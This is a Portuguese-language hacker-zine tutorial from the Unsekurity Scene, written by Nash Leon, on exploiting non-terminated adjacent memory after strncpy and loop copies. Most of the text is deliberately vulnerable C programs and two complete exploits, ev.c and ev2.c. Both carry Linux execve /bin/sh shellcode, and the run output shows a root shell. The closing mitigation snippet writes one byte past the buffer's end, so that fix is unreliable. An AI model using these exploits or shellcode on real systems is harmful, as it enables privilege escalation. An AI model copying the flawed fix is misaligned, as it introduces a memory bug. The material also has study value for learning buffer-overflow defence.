@@ -1,0 +1,633 @@
+##############################################################################
+############################ UNSEKURITY SCENE ################################
+##############################################################################
+
+Desenvolvido por Nash Leon vulgo coracaodeleao.
+nashleon@yahoo.com.br
+
+Estes e outros documentos podem ser obtidos em:
+http://unsekurity.virtualave.net/
+http://www.kimera.com.br/
+http://coracaodeleao.virtualave.net/
+http://int0x80.host.sk/
+
+Observacao: O autor nao se responsabiliza pelo mau uso dos dados e
+            exemplos aqui disponibilizados. Script kiddies(defacers),
+            crackers e analistas de seguranca sao orientados a nao lerem
+            este documento. Todos as informacoes fornecidas possuem apenas
+            carater educacional.
+
+
+		      ***********************************
+		      *  EXPLOITANDO MEMORIA ADJACENTE  *
+		      ***********************************
+
+1 - Introducao
+2 - O Problema
+3 - A Exploitacao
+4 - Expansao do Conceito
+5 - Terminando
+    5.1 - Links e Referencias
+    5.2 - Consideracoes Finais
+    5.2 - Agradecimentos
+
+---------------
+1 - Introducao |
+---------------
+
+Os ataques de Buffer Overflows parecem que ainda perdurarao por algum
+tempo. Apesar dos esforcos de grande parte da Comunidade de Seguranca,
+os exemplos de condicoes de overflow permanecem como uma "constante"
+entre os aplicativos de um modo geral.
+
+Ateh onde eu conheco, o conceito de buffer overflow eh apenas um, no
+entanto, as tecnicas para implementacao deste conceito sao diversas. E
+ateh onde eu sei, o Mudge(antiga L0pht, hoje @stake), foi o primeiro a
+expandir para as massas o conceito de buffer overflows. Desde o worm
+(Robert Morris, 1988) ateh os nossos dias, muitos programadores tem
+procurado diminuir as condicoes de buffer overflows em programas que
+manipulam parametros recebidos de um usuario, substituindo funcoes 
+conhecidas como vulneraveis(strcpy, gets, sprintf) por funcoes que
+necessariamente fazem checagem do tamanho dos parametros recebidos
+(strncpy, snprintf, etc).
+
+No dia 01 de maior de 2000, twich (twitch@vicar.org) tornou manifesto
+uma tecnica capaz de exploitar espacos de memoria adjacente,
+especificamente o manuseio incorreto das funcoes ditas seguras(strcnpy,
+por exemplo). As Analises de codigo-fonte(auditoria) passaram agora
+a incluir todo tipo de funcoes, demonstrando assim que nao basta apenas
+a funcao fazer a checagem do tamanho dos parametros, mas outros fatores
+passaram a ser essenciais.
+
+Neste documento abordaremos esta tecnica. Conhecimentos em C, Assembly
+(AT&T), escrita de exploits(ver docs da Unsek Scene) e linux se fazem
+necessarios. E principalmente mentalidade fucadora!
+
+---------------
+2 - O Problema |
+---------------
+
+Podemos descrever basicamente o problemas com as funcoes ditas seguras
+(strncpy, strncat, etc) eh que elas nao sao capazes de terminar
+automaticamente os buffers ou strings com um NULL. Como assim?
+
+
+Vejamos nosso primeiro codigo inicial:
+
+----------------------------------- b1.c ----------------------------------
+/* Exemplo de strncpy() */
+
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[]){
+char buffer[256];
+
+/* Iremos copiar argv[1] para buffer e imprimir */
+strncpy(buffer,argv[1],sizeof(buffer));
+
+/* Iremos imprimir o tamanho da string recebida em argv[1] */
+printf("strlen: %d | sizeof: %d\n",strlen(buffer), sizeof(buffer));
+
+return 0;
+}
+--------------------------------------------------------------------
+
+Como sabemos, strcnpy() ira copiar os dados recebidos da linha de
+comando ateh chegar o tamanho de buffer(sizeof(buffer)) ou ateh
+receber um NULL(\0), vejamos um exemplo de execucao:
+
+kimera3:/work/testes# ./b1 `perl -e 'print "A" x 255'`
+strlen: 255 | sizeof: 256
+
+A "anomalia" ocorre quando digitamos mais dados que o tamanho do
+buffer de espera. Vejamos:
+
+kimera3:/work/testes# ./b1 `perl -e 'print "A" x 256'`
+strlen: 265 | sizeof: 256
+kimera3:/work/testes# ./b1 `perl -e 'print "A" x 257'`
+strlen: 265 | sizeof: 256
+
+Como podemos notar strlen() contem um tamanho superior ao esperado.
+Isso ocorre porque strncpy() nao recebeu o caracter NULL e de alguma
+forma uniu dados ateh encontrar um NULL. Podemos clarear mais analisando
+o programa abaixo:
+
+-------------------------------- b2.c --------------------------------
+
+/* Exemplo 2 de strncpy() */
+
+#include <stdio.h>
+#include <string.h>
+
+int main(int argc, char *argv[]){
+char buffer1[20], buffer2[8];
+
+/* Iremos copiar argv[1] para buffer1 */
+strncpy(buffer1,argv[1],sizeof(buffer1));
+
+/* Iremos copiar buffer1 para buffer2 */
+strncpy(buffer2,buffer1,sizeof(buffer2));
+
+/* Iremos imprimir agora o conteudo de buffer2 */
+printf("Buffer2: %s\n",buffer2);
+return 0;
+}
+------------------------------------------------------------------------
+
+Executando este programa, teoricamente deveriamos ter a saida de buffer2,
+ou seja, uma string contendo 8 caracteres.Mas vejamos:
+
+kimera3:/work/testes# ./b2 NashLeon
+Buffer2: NashLeonNashLeon
+
+NashLeonNashLeon possue 16 caracteres.
+No mais a gente pode brincar com isso:
+
+kimera3:/work/testes# ./b2 NashLeonUnsek
+Buffer2: NashLeonNashLeonUnsek
+kimera3:/work/testes# ./b2 NashLeonUnsekScene
+Buffer2: NashLeonNashLeonUnsekScene
+kimera3:/work/testes# ./b2 NashLeonUnsekSceneAgain
+Buffer2: NashLeonNashLeonUnsekSceneAgxúÿ¿çâ@
+
+Ele imprime justmente porque o strncpy() nao encontrou o caracter
+NULL como esperava. Com menos de 8 caracteres, poderiamos ter:
+
+kimera3:/work/testes# ./b2 Nash
+Buffer2: Nash
+kimera3:/work/testes# ./b2 NashLeo
+Buffer2: NashLeo
+
+Ou seja, a execucao e impressao em modo normal e esperado, jah que
+temos um NULL na string indicando o termino dela. O stack nesse
+caso iria parecer como:
+
+Memoria 
+ Alta
+  ||     ---------------->      [Topo do Stack]
+  ||     ---------------->  [ 'N'  (buffer2 - 0)  ]
+  ||     ---------------->  [ 'a'  (buffer2 - 1)  ]
+  ||     ---------------->  [ 's'  (buffer2 - 2)  ]
+  ||     ---------------->  [ 'h'  (buffer2 - 3)  ]
+  ||     ---------------->  [ 'L'  (buffer2 - 4)  ]
+  ||     ---------------->  [ 'e'  (buffer2 - 5)  ]
+  ||     ---------------->  [ 'o'  (buffer2 - 6)  ]
+  ||     ---------------->  [ 'n'  (buffer2 - 7)  ]
+  ||     ---------------->  [ 'N'  (buffer1 - 0)  ]
+  ||     ---------------->  [ 'a'  (buffer1 - 1)  ]
+  ||     ---------------->  [ 's'  (buffer1 - 2)  ]
+  ||     ---------------->  [ 'h'  (buffer1 - 3)  ]
+  ||     ---------------->  [ 'L'  (buffer1 - 4)  ]
+  ||     ---------------->  [ 'e'  (buffer1 - 5)  ]
+  ||     ---------------->  [ 'o'  (buffer1 - 6)  ]
+  ||     ---------------->  [ 'n'  (buffer1 - 7)  ]
+  ||     ---------------->  [ 'U'  (buffer1 - 8)  ]
+  ||     ---------------->  [ 'n'  (buffer1 - 9)  ]
+  ||     ---------------->  [ 's'  (buffer1 - 10) ]
+  ||     ---------------->  [ 'e'  (buffer1 - 11) ]
+  ||     ---------------->  [ 'k'  (buffer1 - 12) ]
+  ||     ---------------->  [ 0x00 (buffer1 - 13) ]
+  ||
+  ||           ...
+  \/
+
+			
+Como podemos ver, este problema eh real e pode ser exploitado. Veremos
+como na secao abaixo.
+
+------------------
+3 - A Exploitacao |
+------------------
+
+Este problema pode ser exploitado de inumeras maneiras. Dependendo
+do nivel do atacante, ele pode se aproveitar ateh mesmo do exemplo
+inicial postado neste documento. Como este e todos os meus documentos
+visam NewBies, veremos inicialmente o exemplo mais trivial de se
+exploitar este problema.
+
+Como vimos no exemplo acima, strlen() tende a ser maior do que o
+esperado quando enchemos um buffer e strncpy() nao encontra um NULL,
+criando assim anomalias entre a interacao de funcoes.
+
+Vejamos abaixo uma possivel implicacao disso:
+
+-------------------------------- v.c ------------------------------------
+/* Exemplo inicial de programa vulneravel
+ * Documento sobre problemas com memoria adjacente
+ * Nash Leon - nashleon@yahoo.com.br.
+ */
+
+#include <stdio.h>
+#include <unistd.h>
+
+int bugada(char *buffer);
+
+int   main(int argc,char *argv[]) {
+char buf1[512];
+char buf2[256];
+
+strncpy(buf2,argv[1],sizeof(buf2));
+strncpy(buf1,argv[2],sizeof(buf1));
+
+bugada(buf2);
+return 0;
+}
+
+int bugada(char *buffer){
+char buf3[300];
+int i;
+
+/* note que buf3 suporta 300 bytes enquando
+ * buf2(buffer) teoricamente deveria conter no maximo
+ * 256.
+ */
+for(i = 0; i < strlen(buffer); i++){
+   buf3[i] = buffer[i];
+  }
+}
+----------------------------------------------------------------------
+
+Para exploitarmos este programa, nao tem muito segredo. Vamos encher
+o primeiro buffer com NOPs e o nosso shellcode, e o segundo apenas
+com o endereco de retorno. Existem inumeros esquemas em cima disso,
+em alguns casos, partindo o shellcode ou manipulando NOPs, enfim,
+vejamos o exploit abaixo:
+
+--------------------------------- ev.c -----------------------------------
+/* Primeiro exemplo de exploit para
+ * strcnpy() - Espaco de Memoria Adjacente.
+ * Desenvolvido por Nash Leon p/ tutorial.
+ * nashleon@yahoo.com.br
+ */
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define LENBUFF1  256
+#define LENBUFF2  512
+
+/* Shellcode Padrao */
+char shellcode[] =
+   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+
+/* Captura o Stack Pointer */
+unsigned long get_sp(void){
+   __asm__("movl %esp,%eax");
+}
+
+int  main(int argc,char *argv[]) {
+char buff1[LENBUFF1];
+char buff2[LENBUFF2];
+int i, offset = 0;
+unsigned long retaddr;
+
+if(argc < 2){
+printf("Uso: %s <offset>\n",argv[0]);
+exit(0);
+}
+
+offset = atoi(argv[1]);
+
+memset(buff1,0x90,sizeof(buff1));
+memcpy(buff1+100,shellcode,strlen(shellcode));
+
+retaddr = get_sp() + offset;
+for(i=0; i< LENBUFF2; i+=4){
+   buff2[i]=(retaddr&0x000000ff);
+   buff2[i+1]=(retaddr&0x0000ff00)>>8;
+   buff2[i+2]=(retaddr&0x00ff0000)>>16;
+   buff2[i+3]=(retaddr&0xff000000)>>24;
+        }
+
+printf("Usando Retorno: 0x%x\n", retaddr);
+execl("./v","./v",buff1,buff2,NULL);
+}
+
+----------------------------------------------------------------------
+
+Vamos executar ele, entao:
+
+kimera3:/work/testes# ./ev 150
+Usando Retorno: 0xbffff7f2
+Segmentation fault (core dumped)
+kimera3:/work/testes# ./ev 155
+Usando Retorno: 0xbffff7f7
+sh-2.03#
+
+Como podemos ver, eh funcional! Mas podemos dividi-lo e aprimora-lo
+ateh mesmo para evitar o uso de offsets. Outro possivel esquema pode
+obedecer o seguinte modelo descrito pelo twitch na Phrack 56:
+
+Apos a execucao de strncpy(), buf2 deve parecer com:
+
+  [ 0 ......................................................... 512 ]
+  --------------------------------------------------------------------
+  |                       |                                          |
+  | offset_para_shellcode |      Um monte de lixo(NULL, NOPs)        |
+  |                       |                                          |
+  --------------------------------------------------------------------
+
+
+E buf1 deve parecer com:
+
+  [ 0 .......................................................... 256 ]
+  --------------------------------------------------------------------
+  |                     |           |                                |
+  | Cadeia de NOP's     | shellcode |          Mais NOP's            |
+  |                     |           |                                |
+  --------------------------------------------------------------------
+
+Logo, para este esquema poderiamos ter o seguinte exploit:
+
+-------------------------------- ev2.c ---------------------------------
+/* Segundo exemplo de exploit para
+ * strcnpy() - Espaco de Memoria Adjacente.
+ * Desenvolvido por Nash Leon p/ tutorial.
+ * nashleon@yahoo.com.br
+ */
+
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <string.h>
+
+#define LENBUFF1  256
+#define LENBUFF2  512
+
+/* Shellcode Padrao */
+char shellcode[] =
+   "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+   "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+   "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+
+/* Captura o Stack Pointer */
+unsigned long get_sp(void){
+   __asm__("movl %esp,%eax");
+}
+
+int  main(int argc,char *argv[]) {
+char buff1[LENBUFF1];
+char buff2[LENBUFF2];
+int i, offset = 0;
+unsigned long retaddr;
+
+if(argc < 2){
+printf("Uso: %s <offset>\n",argv[0]);
+exit(0);
+}
+
+offset = atoi(argv[1]);
+
+
+memset(buff1,0x90,sizeof(buff1));
+memcpy(buff1+100,shellcode,strlen(shellcode));
+
+retaddr = get_sp() + offset;
+
+memset(buff2,0x90,sizeof(buff2));
+
+for(i=0; i< LENBUFF2 - 360; i+=4){
+   buff2[i]=(retaddr&0x000000ff);
+   buff2[i+1]=(retaddr&0x0000ff00)>>8;
+   buff2[i+2]=(retaddr&0x00ff0000)>>16;
+   buff2[i+3]=(retaddr&0xff000000)>>24;
+        }
+
+printf("Usando Retorno: 0x%x\n", retaddr);
+execl("./v","./v",buff1,buff2,NULL);
+}
+
+----------------------------------------------------------------------
+
+Executando:
+
+kimera3:/work/testes# ./ev2 120
+Usando Retorno: 0xbffff7c4
+sh-2.03#
+
+
+Bom, como podemos perceber nao ha muito problema em exploitar este
+tipo de problema. Mas podemos ir mais alem.
+
+-------------------------
+4 - Expansao do Conceito |
+-------------------------
+
+Qualquer funcao que manipula strings a espera de um caracter NULL
+para "encerrar" a string pode estar vulneravel a este tipo de problema.
+Vimos no exemplo acima, strncpy(), uma funcao que eh muito usada, mas
+podemos ir mais alem.
+
+As seguintes funcoes tambem podem apresentar problemas:
+
+   fread()
+   read() [ read(), readv(), pread() ]
+   memcpy()
+   memccpy()
+   memmove()
+   bcopy()
+   for(i = 0; i < MAXSIZE; i++)
+      buf[i] = buf2[i];
+   gethostname()
+   strncat()
+   e etc.
+
+Hoje em dia, a que mais chama a atencao eh a for().
+Vejamos o exemplo abaixo:
+
+------------------------------- v2.c ---------------------------------
+/* Exemplo  de programa vulneravel em for().
+ * Documento sobre problemas com memoria adjacente
+ * Nash Leon - nashleon@yahoo.com.br.
+ */
+
+#include <stdio.h>
+#include <unistd.h>
+
+#define MAXSIZE  256
+
+int bugada(char *buffer);
+
+int   main(int argc,char *argv[]) {
+char buf1[MAXSIZE];
+char buf2[MAXSIZE];
+char *pam;
+int i;
+
+pam = argv[1];
+
+/* Copiamos conteudo de argv[1] para buf1 */
+
+for(i = 0; i < MAXSIZE; i++){
+buf1[i] = pam[i];
+}
+
+for(i =0; i < MAXSIZE; i++){
+buf2[i] = buf1[i];
+}
+
+bugada(buf2);
+return 0;
+}
+
+int bugada(char *buffer){
+char buf3[MAXSIZE];
+int i;
+for(i = 0; i < strlen(buffer); i++){
+   buf3[i] = buffer[i];
+  }
+}
+-------------------------------------------------------------------
+
+# gdb ./v2
+GNU gdb 4.18
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are
+welcome to change it and/or distribute copies of it under certain
+conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.
+This GDB was configured as "i686-pc-linux-gnu"...
+(gdb) r `perl -e 'print "A" x 256'`
+Starting program: /work/testes/./v2 `perl -e 'print "A" x 256'`
+warning: Unable to find dynamic linker breakpoint function.
+GDB will be unable to debug shared library initializers
+and track explicitly loaded dynamic code.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb)
+
+
+Bom, como podemos ver, o problema eh serio! E condicoes com for()
+ainda tem sido manifestadas em inumeros programas. O conceito eh este
+e em breve espero poder abordar maiores pormenores sobre isso.
+
+---------------
+5 - Terminando |
+---------------
+
+Mais um documento sobre buffer overflows. Inumeras tecnicas existem e
+este documento eh mais um basico.
+
+Para impedir que os buffers sejam usados em condicoes de overflow
+pela funcoes, em muitos casos basta apenas inserir um caracter NULL(\0)
+no final do buffer, algo como:
+
+#define  MAXSIZE  256
+...
+for(i = 0; i < MAXSIZE; i++){
+buf1[i] = pam[i];
+}
+buf1[MAXSIZE - 1] = '\0';
+...
+
+ou entao jah evitar quais problemas na propria funcao receptora:
+#define  MAXSIZE  256
+...
+for(i = 0; i < MAXSIZE - 1; i++){
+buf1[i] = pam[i];
+}
+buf1[MAXSIZE] = '\0';
+...
+
+
+5.1 - Links e Referencias
+--------------------------
+
+Existem varios documentos descrevendo esta tecnica, no entanto, em
+forma de tutorial encontrei apenas dois ateh agora:
+
+P56-14 - "TAKING ADVANTAGE OF NON-TERMINATED ADJACENT MEMORY SPACES" -
+escrito por twitch - http://www.phrack.org/
+
+" Exploiting none terminated buffers" - escrito por pr1 -
+http://www.u-n-f.com/
+
+Outros links interessantes:
+
+http://www.kimera.com.br/
+http://www.linuxsecurity.com.br/
+http://unsekurity.virtualave.net/
+http://www.axur.org/
+http://www.securenet.com.br/
+http://int0x80.host.sk/
+http://www.unsecurity.org/
+
+
+http://www.core-sdi.com/
+http://packetstorm.linuxsecurity.com/
+http://www.securityfocus.com/
+http://www.counterpane.com/
+http://www.atstake.com/
+http://teso.scene.at/
+
+
+5.2 - Consideracoes Finais
+---------------------------
+
+Buffer overflows eh uma tecnica fascinante, como qualquer outra tecnica
+fucadora. O interessante aqui nao eh a programacao, mas a malicia.
+Tenho visto muitas pessoas confundirem hacking com programacao. Achando
+que programar em Assembly ou saber fazer isso ou aquilo outro os torna
+especiais.
+
+Nao sei, mas neste ponto concordo com Mitnick:
+
+"Super-programadores sao pessimos hackers!".
+
+De modo que, a malicia nao estah associada a capacidade de programar.
+Dizem que programar eh resolver problemas, mas vejo muitos programadores
+seguirem sempre uma logica pre-definida, ensinada por alguem. O hacking
+ultrapassa essa esfera. Eh resolver problemas com o que se tem na mao
+e nao construindo coisas para facilitar.Eh alterar a propria logica,
+a regra do jogo, manipulando-a de uma forma nao-convencional(pre-
+estabelecida).
+
+Programar eh importante, mas eh apenas uma das facetas do hacking, tem
+muito mais coisas e coisas mais importantes que estas.
+
+Devemos dar um passo devagar e constante, olhando tudo ao nosso redor
+e procurando definir limites as nossas acoes. A experiencia se adquire
+com o tempo, o que antes parecia devaneio, agora pode ser realidade,
+e o que muitos creem hoje ser fabula amanha pode se tornar um pesadelo.
+Nao existe destino individual, cada um decide qual lado da forca quer
+ajudar.A utilizacao do conhecimento eh o que nos torna o ser humano
+que somos e nao o contrario. Se guardarmos o conhecimento apenas para
+nos mesmos, deixaremos de lado a existencia de um hacker no espirito
+humano.
+
+
+5.3 - Agradecimentos
+---------------------
+
+Agradeco a Deus pela oportunidade de ter um objetivo na vida.
+E tambem as pessoas que compartilham o conhecimento para produzir mais 
+conhecimento e beneficiar a vida das pessoas. Tambem as inumeros grupos
+e fucadores que nao podem assinar os documentos, ou exploits e programas
+que escrevem mas que utilizam suas forcas para ajudar o proximo. Agradeco
+aos hackers corajosos que disponibilizam infos em paises cuja lei nao
+permite, que sao perseguidos por lutarem contra a propriedade intelectual
+e por procurarem democratizar nao apenas os softwares mas tambem, e
+principalmente, a informacao.
+
+Por fim, a todos que colaboram com a cena hacker aqui no brasil e que sao
+criticados e hostilizados por acreditarem que a etica hacker pode ser
+real para aqueles que a vivenciam. Aos grupos Int 0x80, Unsekurity Scene,
+ZinesBR, Unsecurity.org, EoH, as scenes de outros paises, a 
+linuxsecurity.com.br, Axur Corp, Kimera - Solucoes em Seguranca, 
+BufferOverflow.org, e a todos que fazem parte deste universo da
+inseguranca da informacao.
+
+Um Abraco
+
+Nash Leon.
